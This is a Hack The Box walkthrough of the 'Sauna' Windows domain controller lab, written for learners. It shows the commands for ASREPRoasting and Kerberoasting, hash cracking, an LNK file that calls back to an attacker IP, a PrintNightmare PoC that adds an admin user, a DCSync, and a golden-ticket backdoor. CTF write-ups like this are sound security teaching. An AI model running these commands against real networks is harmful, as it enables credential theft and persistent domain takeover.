+++
tags = ["Box", "HTB", "Easy", "Windows", "LDAP", "Kerberos", "Active Directory", "Kerberoasting", "ASREPRoasting", "PrintNightmare", "CVE-2021-1675"]
draft = false
title = "Sauna HTB Walkthrough"
author = "bloodstiller"
date = 2024-11-03
+++

-   {{< figure src="/ox-hugo/2024-11-03-155301_.png" >}}


## Sauna Hack The Box Walkthrough/Writeup: {#sauna-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Sauna>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -Pn -oA TCPbasicScan`
        ```shell
        kali in HTB/BlogEntriesMade/Sauna/scans/nmap  🍣 main  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 08:01:03 zsh ❯ nmap $box -Pn -oA TCPbasicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 08:01 GMT
        Nmap scan report for 10.129.118.79
        Host is up (0.038s latency).
        Not shown: 988 filtered tcp ports (no-response)
        PORT     STATE SERVICE
        53/tcp   open  domain
        80/tcp   open  http
        88/tcp   open  kerberos-sec
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        389/tcp  open  ldap
        445/tcp  open  microsoft-ds
        464/tcp  open  kpasswd5
        593/tcp  open  http-rpc-epmap
        636/tcp  open  ldapssl
        3268/tcp open  globalcatLDAP
        3269/tcp open  globalcatLDAPssl

        Nmap done: 1 IP address (1 host up) scanned in 4.38 seconds

        ```
    -   **Initial thoughts**:
        -   Good places to start enumeration are, DNS, Web, RPC, LDAP, Kerberos &amp; SMB.


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:

    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`

    <!--listend-->

    ```shell
    kali in HTB/BlogEntriesMade/Sauna/scans/nmap  🍣 main  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
    🕙 08:01:33 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
    [sudo] password for kali:
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 08:03 GMT
    Nmap scan report for 10.129.118.79
    Host is up (0.038s latency).
    Not shown: 65515 filtered tcp ports (no-response)
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    80/tcp    open  http          Microsoft IIS httpd 10.0
    |_http-server-header: Microsoft-IIS/10.0
    |_http-title: Egotistical Bank :: Home
    | http-methods:
    |_  Potentially risky methods: TRACE
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-03 15:07:20Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    9389/tcp  open  mc-nmf        .NET Message Framing
    49667/tcp open  msrpc         Microsoft Windows RPC
    49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49674/tcp open  msrpc         Microsoft Windows RPC
    49677/tcp open  msrpc         Microsoft Windows RPC
    49698/tcp open  msrpc         Microsoft Windows RPC
    49717/tcp open  msrpc         Microsoft Windows RPC
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2019 (89%)
    Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
    No exact OS matches for host (test conditions non-ideal).
    Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-time:
    |   date: 2024-11-03T15:08:18
    |_  start_date: N/A
    |_clock-skew: 7h00m00s
    | smb2-security-mode:
    |   3:1:1:
    |_    Message signing enabled and required

    OS and Service detection performed. Please report any incorrect resu
    ```


### LDAP `389`: {#ldap-389}


#### Using LDAP to enumerate further: {#using-ldap-to-enumerate-further}

-   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    -   We can actually retrieve a significant amount of information via anonymous bind such as:
        -   A list of all users
        -   A list of all groups
        -   A list of all computers.
        -   User account attributes.
        -   The domain password policy.
        -   Enumerate users who are susceptible to AS-REPRoasting.
        -   Passwords stored in the description fields
    -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapire>
    -   <https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb>
        -   `python3 ldapchecker.py $box`
            -   It will dump general information &amp; also detailed &amp; simple information including:
                -   Groups
                -   Users

-   It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in HTB/BlogEntriesMade/Sauna/scans/ldap  🍣 main  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 08:08:25 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box
        Attempting to connect to 10.129.118.79 with SSL...
        Failed to connect with SSL.
        Attempting to connect to 10.129.118.79 with non-SSL...
        Connected successfully using anonymous bind. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=EGOTISTICAL-BANK,DC=LOCAL
            CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
            CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
            DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
            DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
        ```

    2.  <span class="underline">We have the domain functionality level</span>:
        ```shell
        Other:
          domainFunctionality:
            7
          forestFunctionality:
            7
          domainControllerFunctionality:
            7
          rootDomainNamingContext:
            DC=EGOTISTICAL-BANK,DC=LOCAL
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: that any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.)
            ```shell
             serverName:
                CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
            ```
-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.


#### Updating ETC/HOSTS &amp; Variables {#updating-etc-hosts-and-variables}

-   **Updated Domain &amp; Machine Variables for Testing**:
    -   Now that I have this information, I can update the \`domain\` and \`machine\` variables used in tests:
        -   `update_var domain "EGOTISTICAL-BANK.LOCAL"`
        -   `update_var machine "SUANA"`
        -   {{< figure src="/ox-hugo/2024-11-03-082029_.png" >}}
            -   +Note+: This is a type-o it should say `SAUNA` I corrected this later. Always copy and paste!

<!--listend-->

-   **Updating `/etc/hosts` for DNS and LDAP Queries**:
    -   I update my `/etc/hosts` file to enable tools like [kerbrute](<https://github.com/ropnop/kerbrute>) for user enumeration and other tools that require DNS or LDAP for queries:
        -   `echo "$box   $domain $machine.$domain" | sudo tee -a /etc/hosts`
        -   {{< figure src="/ox-hugo/2024-11-03-082051_.png" >}}


#### Syncing Clocks for Kerberos Exploitation: {#syncing-clocks-for-kerberos-exploitation}

-   Since Kerberos is enabled on this host, it's best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.
    -   `sudo ntpdate -s $domain`
    -   +Note+: I am doing this now as we have the DNS name etc.


### DNS `53`: {#dns-53}

-   **Using dnsenum to enumerate DNS entries**:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain`
    -   {{< figure src="/ox-hugo/2024-11-03-092025_.png" >}}
    -   Nothing of note.


### RPC: {#rpc}

-   I connect via rpc and try and enumerate the groups &amp; users but have nno perms:
    -   `rpcclient -U '%' $box`
    -   {{< figure src="/ox-hugo/2024-11-03-095459_.png" >}}


### Kerberos `88`: {#kerberos-88}


#### Using [Kerbrute](https://github.com/ropnop/kerbrute) to bruteforce Usernames: {#using-kerbrute-to-bruteforce-usernames}

-   **As kerberos is present we can enumerate users using** [kerbrute](https://github.com/ropnop/kerbrute):
    -   `kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt`
    -   {{< figure src="/ox-hugo/2024-11-03-083448_.png" >}}
    -   **We get two hits which I add to my list of users**:
        -   hsmith@EGOTISTICAL-BANK.LOCAL
        -   fsmith@EGOTISTICAL-BANK.LOCAL


#### Trying Usernames as Passwords: {#trying-usernames-as-passwords}

-   **I always try usernames as passwords as well**:
    -   `netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+]`
    -   No hits.


#### ASREPRoasting: {#asreproasting}


##### Using netexec for ASReproasting: {#using-netexec-for-asreproasting}

-   **We should always try and asreproast with a null/guest session anyway**
    -   `netexec ldap $box -u '' -p '' --asreproast asrep.txt`
    -   `netexec ldap $box -u guest -p '' --asreproast asrep.txt`
    -   We get no hits.


##### Using Impacket-GetNPUsers for asreproasting: {#using-impacket-getnpusers-for-asreproasting}

-   As we have some usernames we can try targeted asreproasting.
-   `impacket-GetNPUsers $domain/ -dc-ip $box -no-pass -usersfile Users.txt -format hashcat -outputfile asrep.txt`
-   {{< figure src="/ox-hugo/2024-11-03-101732_.png" >}}
-   We get a hit for `fsmith`


### Cracking fsmiths asrep hash using hashcat: {#cracking-fsmiths-asrep-hash-using-hashcat}

-   **I use hashcat to crack the ticket**:
    -   `hashcat -m 18200 asrep.txt /home/kali/Wordlists/rockyou.txt`
    -   {{< figure src="/ox-hugo/2024-11-03-102339_.png" >}}


### SMB `445`: {#smb-445}

-   +Important note on methodology+: If you're wondering why I am still enumerating for null sessions, web, etc when I have cracked a hash, it's because there could still be some interesting findings and low-hanging fruit. Boxes are great as they train us and help us hone our skills, but businesses want all findings not just the most serious. It's good practice to treat boxes like an engagement. I you want to jump ahead, go to the foothold section.


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

-   **This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold**:
    -   `netexec smb $box -u 'guest' -p '' --shares`
        -   {{< figure src="/ox-hugo/2024-11-03-085130_.png" >}}
        -   Guest account is disabled.
    -   `netexec smb $box -u '' -p '' --shares`
        -   {{< figure src="/ox-hugo/2024-11-03-085157_.png" >}}
        -   Null session has been disabled:


### Web `80`: {#web-80}

-   **Web Enumeration via Burp Suite**:
    -   When enumerating a website, always use Burp Suite. This allows you to:
    -   Record all potential injection points.
    -   Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.


#### Enumerating Injection Points: {#enumerating-injection-points}

-   **Looking at the site there appears to be an injection point in the** `Apply Now` **page**:
    -   I enter data.
    -   {{< figure src="/ox-hugo/2024-11-03-085738_.png" >}}

    -   **Once submitted I get the following response**:
        -   {{< figure src="/ox-hugo/2024-11-03-090010_.png" >}}
        -   `405 - HTTP verb used to access this page is not allowed.`

    -   **Looking at the request and response in** `burpsuite` **we see the following**:
        -   {{< figure src="/ox-hugo/2024-11-03-090057_.png" >}}
        -   We can see this was originally sent as a `POST` request, but the page only allows the following HTTP methods: `GET, HEAD, OPTIONS`, and `TRACE`.
        -   Let’s re-send our request using one of these allowed methods to observe the response.


#### Verb Tampering Enumeration: {#verb-tampering-enumeration}

-   **I right-click the orginal request and select** "Send to Repeater":
    -   {{< figure src="/ox-hugo/2024-11-03-090325_.png" >}}

-   **Checking** `GET` **Reqeuest**:
    -   {{< figure src="/ox-hugo/2024-11-03-090645_.png" >}}
    -   Nothing of note.

-   **Checking** `HEAD` **Reqeuest**:
    -   {{< figure src="/ox-hugo/2024-11-03-090714_.png" >}}
    -   Nothing of note.

-   **Checking** `OPTIONS` **Reqeuest**:
    -   {{< figure src="/ox-hugo/2024-11-03-090807_.png" >}}
    -   Nothing of note.

-   **Checking** `TRACE` **Reqeuest**:
    -   {{< figure src="/ox-hugo/2024-11-03-090842_.png" >}}
    -   Nothing of note.


#### Dirbusting the webserver using ffuf: {#dirbusting-the-webserver-using-ffuf}

-   **I Perform some directory busting to see if there are any interesting directories**:
    -   `ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://10.129.118.79/FUZZ -fc 403 -ic`
    -   {{< figure src="/ox-hugo/2024-11-03-091558_.png" >}}
    -   Nothing of note in the toplevel.

-   **I also check for additional files**:
    -   `ffuf -w /home/kali/Wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://10.129.118.79/FUZZ.html -fc 403 -ic`
    -   {{< figure src="/ox-hugo/2024-11-03-095253_.png" >}}
-   There does not seem to be anything immediatley obvious with the webserver so I am going to continue enumerating however now as our user.


## 2. Foothold: {#2-dot-foothold}


### Enumerating as fsmith: {#enumerating-as-fsmith}


#### Enumerating shares: {#enumerating-shares}

-   **I see what shares we have access to**:
    -   `netexec smb $box -u $user -p $pass --shares`
    -   {{< figure src="/ox-hugo/2024-11-03-102711_.png" >}}
    -   There are some here which look interesting:
        -   SYSVOL (can hold scripts)
        -   print$ (printer drivers)
        -   RICOH Aficio SP 8300DN PCL 6


#### Enumerating the host via evil-winrm: {#enumerating-the-host-via-evil-winrm}

-   **I connect via evil-winrm**:
    -   `evil-winrm -i $box -u $user -p $pass`
    -   {{< figure src="/ox-hugo/2024-11-03-102910_.png" >}}

-   **I grab the user flag**:
    -   {{< figure src="/ox-hugo/2024-11-03-103002_.png" >}}


#### Checking privileges and group membership: {#checking-privileges-and-group-membership}

-   **Group**:
    -   `whoami /groups`
    -   {{< figure src="/ox-hugo/2024-11-03-103101_.png" >}}
    -   nothing of note

-   **Privs**:
    -   `whoami /priv`
    -   {{< figure src="/ox-hugo/2024-11-03-103125_.png" >}}
    -   nothing of note


#### Enumerating users: {#enumerating-users}

-   {{< figure src="/ox-hugo/2024-11-03-103224_.png" >}}
-   We can see that there is a user called `svc_loanmgr` so there is a service account running somewhere.
    -   I will enumerate more users and groups using impacket.


### Enumerating Users &amp; Groups on the domain using impacket-lookupsid: {#enumerating-users-and-groups-on-the-domain-using-impacket-lookupsid}

-   **I run** `impacket-lookupsid` **to enumerate all users and groups on the domain**:
    -   `impacket-lookupsid $user@$box -domain-sids`
    -   {{< figure src="/ox-hugo/2024-11-03-103354_.png" >}}
    -   As expected no other users on the domain apart from the standard built in ones. I add these users to my user list.


### Using smbclient to enumerate shares: {#using-smbclient}

-   `print$` **share enumeration**:
    -   `smbclient -U $user "\\\\$box\\print$"`
    -   {{< figure src="/ox-hugo/2024-11-03-103843_.png" >}}
    -   +Note+: This appears to be a standard printer share. I will leave this for the moment and come back to it later if needed.

-   `NETLOGON` **share enumeration**:
-   `smbclient -U $user "\\\\$box\\NETLOGON"`
    -   It's empty (as expected)
    -   {{< figure src="/ox-hugo/2024-11-03-103812_.png" >}}

-   `SYSVOL` **share enumeration**:
    -   `smbclient -U $user "\\\\$box\\SYSVOL"`
    -   Scripts dir is empty:
        -   {{< figure src="/ox-hugo/2024-11-03-104020_.png" >}}

-   `Ricoh` **share enumeration**:
-   `smbclient -U $user "\\\\$box\\RICOH Aficio SP 8300DN PCL 6"`
    -   {{< figure src="/ox-hugo/2024-11-03-110017_.png" >}}
    -   Empty but writeable, we can come back to this later.


### Kerberoasting hsmith: {#kerberoasting-hsmith}

As we have credentials we can perform kerberoasting:

-   **I use netexec to kerberoast**:
    -   `netexec ldap $machine.$domain -u $user -p $pass --kerberoasting kerb.out`
    -   We get a hit for `hsmith`
    -   {{< figure src="/ox-hugo/2024-11-03-105350_.png" >}}


### Cracking hsmith's password with hashcat: {#cracking-hsmith-s-password-with-hashcat}

-   **I run it through hashcat and crack the hash**:
    -   `hashcat -m 13100 kerb.out ~/Wordlists/rockyou.txt`
    -   {{< figure src="/ox-hugo/2024-11-03-105549_.png" >}}
    -   It cracks, annoyingly it's the same password as `fsmith` so I should have checked for password re-use between users, this is a learning moment.


### Enumerating as hsmith: {#enumerating-as-hsmith}

-   **Checking the shares they have access to we can see it's the same as fsmith**.
    -   {{< figure src="/ox-hugo/2024-11-03-105806_.png" >}}

-   **Interestingly they do not have win-rm access**.
    -   {{< figure src="/ox-hugo/2024-11-03-105834_.png" >}}


### Creating an LNK file on the rico share: {#creating-an-lnk-file-on-the-rico-share}

-   I create an LNK file on the rico share using netexec:
    -   `netexec smb $box -u $user -p $pass -M slinky -o SERVER=10.10.14.121 NAME=important`
    -   {{< figure src="/ox-hugo/2024-11-03-110750_.png" >}}

-   **I start my listener using responder**:
    -   `sudo responder -I tun0`
    -   {{< figure src="/ox-hugo/2024-11-03-111545_.png" >}}
    -   I leave it running for a long time but do not get a hit.


#### LNK attack Explanation: {#lnk-attack-explanation}

-   Even though this didn't work I wanted to explain the concept and methodology.
    -   Creating an `LNK` file on the rico SMB share using netexec allows me to inject a shortcut that, when opened, will trigger code execution with minimal user interaction. By specifying the parameters `SERVER=10.10.14.121` and `NAME=important`, I'm directing the LNK to attempt a network connection to my listener at `10.10.14.121`, exploiting the target's file interaction to potentially escalate privileges or gain further access. This setup leverages user trust in shared network files, making it a low-profile way to initiate a callback for further exploitation.


### Performing a bloodhound scan: {#performing-a-bloodhound-scan}

-   Usually I would do this first, however I got caught up in easy low-hanging fruit priv-esc paths.
-   `bloodhound-python -dc $machine.$domain -c All -u $user -p $pass -d $domain -ns $box`
-   {{< figure src="/ox-hugo/2024-11-03-152842_.png" >}}
-   Looking at the results there is nothing immediately sticking out to me.


### Enumerating description fields using rpcclient: {#enumerating-description-fields-using-rpcclient}

-   I connect using `rpcclient` and enumerate the description fields of the administrator and `svc_loanmgr` account in-case they had stored credentials in these field however they don't have any:
    -   {{< figure src="/ox-hugo/2024-11-03-163609_.png" >}}



## 3. Privilege Escalation: {#3-dot-privilege-escalation}


### Privilege escalation Route 1 PrintNightmare: {#privilege-escalation-route-1-PrintNightmare}


#### Discovering the host is susceptible to PrintNightmare vulnerability: {#discovering-the-host-is-susceptible-to-PrintNightmare-vulnerability}

-   `netexec smb $box -u $user -p $pass -M printnightmare`
-   {{< figure src="/ox-hugo/2024-11-03-155445_.png" >}}
-   +Note+: I have a priv-esc checklist that I run through when I am working on machines and checking for `PrintNightmare` is one of these checks (I didn't just magically stumble upon the idea). However now we have a viable path forward.


### Privilege escalation Route 2 svc_loanmgr: {#privilege-escalation-route-2-svc-loanmgr}

-   There is also the option of this other privesc path (and I believe intended approach)


#### Approach 1: Using winpeas to find clear-text creds stored in Registry Keys: {#approach-1-using-winpeas-to-find-clear-text-creds-stored-in-registry-keys}

-   **I upload** `winpeas.ps1` **via my evil-winrm session as** `fsmith`:

-   **Running it we find that there are creds available for** `win-logon` **which are stored in clear-text**:
    -   {{< figure src="/ox-hugo/2024-11-03-200441_.png" >}}
    -   +Note+: That the default username is `svc_loanmanager` however there is not user with that name on this machine. However there is a `svc_loanmgr`:

-   **Verifying the credentials work for** `svc_loanmgr`:
    -   {{< figure src="/ox-hugo/2024-11-04-073359_.png" >}}


#### Approach 2: Manually Enumerating Registry Keys for Valuable Information: {#approach-2-manually-enumerating-registry-keys-for-valuable-information}

-   **We can also search for these manually using**:
    -   `reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"`
    -   {{< figure src="/ox-hugo/2024-11-03-200725_.png" >}}
    -   +Note+: Direct registry access may trigger logging events or alerts, especially if policies are in place.


#### Discovering svc_loanmgr has DC-Sync privileges: {#discovering-svc-loanmgr-has-dc-sync-privileges}

-   **Looking back in bloodhound we can see our user has** `GetChangesAll` **&amp;** `GetChanges` **over the root domain object**:
    -   {{< figure src="/ox-hugo/2024-11-04-073716_.png" >}}
    -   Looking at the attack paths we have with `GetChangesAll` we can see we can:

        > You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:

        -   This means we can perform a dcsync attack to get the hashes.
        -   {{< figure src="/ox-hugo/2024-11-04-074029_.png" >}}


#### Overview of these rights: {#overview-of-these-rights}


##### Replicating Directory Change (GetChanges): {#replicating-directory-change--getchanges}

-   **Display Name**: [Replicating Directory Changes](https://learn.microsoft.com/en-gb/windows/win32/adschema/r-ds-replication-get-changes)
-   **Common Name**: `DS-Replication-Get-Changes`, `GetChanges`
-   **Rights GUID Value**: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`
-   **Interpretation**: Required to replicate changes from a given NC (Naming Context).
    -   **To perform a DCSync attack, this extended right and** `DS-Replication-Get-Changes-All` **(below)** +are required+.
-   **In bloodhound displayed as**: `GetChanges`


##### Replicating Directory Changes All (GetChangesAll): {#replicating-directory-changes-all--getchangesall}

-   **Display Name**: [Replicating Directory Changes All](https://learn.microsoft.com/en-gb/windows/win32/adschema/r-ds-replication-get-changes-all)
-   **Common Name**: `DS-Replication-Get-Changes-All`, `GetChangesAll`
-   **Rights GUID Value**: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`
-   **Interpretation**: Allows the replication of secret domain data.
    -   **To perform a DCSync attack, this extended right and** `DS-Replication-Get-Changes` **(above)** +are required+.
-   **In bloodhound displayed as**: `GetChangesAll`

    
## 4. Ownership: {#4-dot-ownership}


### Privilege escalation Route 1 PrintNightmare: {#privilege-escalation-route-1-PrintNightmare}


#### Creating a new administrator user using CVE-2021-1675 (PrintNightmare exploit): {#creating-a-new-administrator-user-using-cve-2021-1675--PrintNightmare-exploit}

1.  **Download POC**:
    -   `git clone https://github.com/calebstewart/CVE-2021-1675.git`
    -   This is the exploit I have used before so will use again.

2.  **Using our existing** `fsmith` **credentials upload the script via** `evil-winrm`:
    -   {{< figure src="/ox-hugo/2024-11-03-155945_.png" >}}

3.  **Bypass Execution Policy**:
    -   `Set-ExecutionPolicy Bypass -Scope Process`
    -   {{< figure src="/ox-hugo/2024-11-03-160005_.png" >}}

4.  **Import the exploit Module**:
    -   `Import-Module .\CVE-2021-1675.ps1`
    -   {{< figure src="/ox-hugo/2024-11-03-160025_.png" >}}

5.  **Add our new user with PrintNightmare PowerShell PoC**:
    -   `Invoke-Nightmare -NewUser "bloodstiller" -NewPassword "Pwnd1234!" -DriverName "PrintIt"`
    -   {{< figure src="/ox-hugo/2024-11-03-160107_.png" >}}

6.  **Confirm our user added is added**:
    -   `net user bloodstiller`
    -   {{< figure src="/ox-hugo/2024-11-03-160139_.png" >}}
    -   We can see we have `local admin` privs.


#### Connecting as our new local-admin user: {#connecting-as-our-new-local-admin-user}

-   **I connect usin** `evil-winrm`
-   {{< figure src="/ox-hugo/2024-11-03-160239_.png" >}}

-   **As we have local admin privs we can retrieve the flag from the administrator folder**:
    -   {{< figure src="/ox-hugo/2024-11-03-160321_.png" >}}


### Privilege escalation Route 2 svc_loanmgr: {#privilege-escalation-route-2-svc-loanmgr}


#### Performing a DC-SYNC attack as svc_loanmgr: {#performing-a-dc-sync-attack-as-svc-loanmgr}

-   **We perform the dc-sync attack using** `svc_loanmgr` **account and** `impacket-secretsdump`:
    -   `impacket-secretsdump $domain/$user:$pass@$box -dc-ip $box`
    -   {{< figure src="/ox-hugo/2024-11-04-074618_.png" >}}
    -   All of the same steps can be peformed to create a golden ticket in the persistence section now etc.




## 5. Persistence: {#5-dot-persistence}


### Dumping NTDS.dit/DC-SYNC attack: {#dumping-ntds-dot-dit-dc-sync-attack}

-   **As we are local admin we can perform a DCSync Attack using netexec**:
    -   `netexec smb $box -u $user -p $pass -M ntdsutil`
    -   {{< figure src="/ox-hugo/2024-11-03-163117_.png" >}}

-   **Extract all hashes from netexec**
    -   `for file in /home/kali/.nxc/logs/*.ntds; do cat "$file" | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'; printf '\n'; done`
    -   {{< figure src="/ox-hugo/2024-11-03-163327_.png" >}}


### Creating a Kerberos Golden Ticket: {#creating-a-kerberos-golden-ticket}

-   **Using** `impacket-lookupsid` **to get the Search for the Domain SID**:
    -   `impacket-lookupsid $domain/$user@$machine.$domain -domain-sids`
    -   {{< figure src="/ox-hugo/2024-11-03-162358_.png" >}}

-   **Sync our clock to the host using ntupdate**:
    -   `sudo ntpdate -s $domain`
    -   This does not need to be done again (as I have already done it. However i've left it here in case when you do this you forget)

-   **Using** `impacket-ticketer` **to create the Golden Ticket**:
    -   `impacket-ticketer $box -nthash [KRBTGTHash] -domain-sid [SID] -domain $domain Administrator`
    -   {{< figure src="/ox-hugo/2024-11-03-161551_.png" >}}

<!--listend-->

-   **Export the ticket to the** `KRB5CCNAME` **Variable**:
    -   `export KRB5CCNAME=./Administrator.ccache`
    -   {{< figure src="/ox-hugo/2024-11-03-162935_.png" >}}

-   **Use the ticket for connecting via** `psexec`
    -   `impacket-psexec -k -no-pass $machine.$domain`
    -   {{< figure src="/ox-hugo/2024-11-03-162954_.png" >}}


#### Why create a golden ticket? {#why-create-a-golden-ticket}

-   "But bloodstiller why are you making a golden ticket if you have the admin hash?" Glad you asked:
    -   Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here’s why:
    -   `KRBTGT` **Hash Dependence**:
        -   Golden Tickets are generated using the `KRBTGT` account hash from the target’s domain controller.
        -   Unlike user account passwords, `KRBTGT` hashes are rarely rotated (and in many organizations, they are never changed), so the Golden Ticket remains valid indefinitely.
    -   `KRBTGT` **Hash—The Key to It All (for upto 10 years)**:
        -   A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials.
        -   This makes it a reliable backdoor, especially if re-access is needed long after initial entry.
        -   **Think about it**: even if they reset every user’s password (including the administrator etc) your Golden Ticket is still valid because it’s tied to the `KRBTGT` account, not individual users.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I should always check for password re-use even between accounts!
2.  It was good to attack this from a privilege escalation point of view from 2 different angles, showing the more recent PrintNightmare as well as the intended route of WinLogon clear-text creds. 


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Should have copied and pasted, ended up writing suana instead of sauna in my `/etc/hosts`


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


